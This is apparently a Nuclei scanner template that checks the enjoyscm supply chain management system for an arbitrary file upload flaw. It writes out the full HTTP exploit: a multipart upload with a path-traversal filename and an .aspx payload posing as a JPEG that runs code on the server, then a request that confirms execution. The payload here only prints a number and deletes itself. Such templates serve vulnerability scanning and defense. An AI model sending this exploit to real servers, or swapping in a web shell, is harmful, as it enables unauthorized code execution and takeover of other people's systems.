id: enjoyscm-UploadFile-upload
info:
  name: Template Name
  author: wangzong
  severity: critical
  description: enjoyscm供应链管理系统 UploadFile接口处存在任意文件上传漏洞，攻击者可上传恶意木马获取服务器权限。
  reference:
    - http://kpanda.wiki/#/Vulnhub/E4-1Enjoyscm-%E4%BE%9B%E5%BA%94%E9%93%BE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0?id=e4-1enjoyscm-%e4%be%9b%e5%ba%94%e9%93%be%e7%ae%a1%e7%90%86%e7%b3%bb%e7%bb%9f-%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0
  tags: tags
variables:
  filename: "{{rand_base(6)}}" 
  
http:
  - raw:
      - |
        POST /ImportData/UploadFile HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
        Accept: application/json, text/javascript, */*; q=0.01
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2,
        X-Requested-With: XMLHttpRequest
        Content-Type: multipart/form-data; boundary=----21909179191068471382830692394
        Connection: close
        Content-Length: 274

        ------21909179191068471382830692394
        Content-Disposition: form-data; name="file"; filename="../../../{{filename}}.aspx"
        Content-Type: image/jpeg

        <%@Page Language="C#"%><% Response.Write(111*111);System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath));%>
        ------21909179191068471382830692394--
      - |+
        GET /{{filename}}.aspx HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body
        words:
          - '12321'
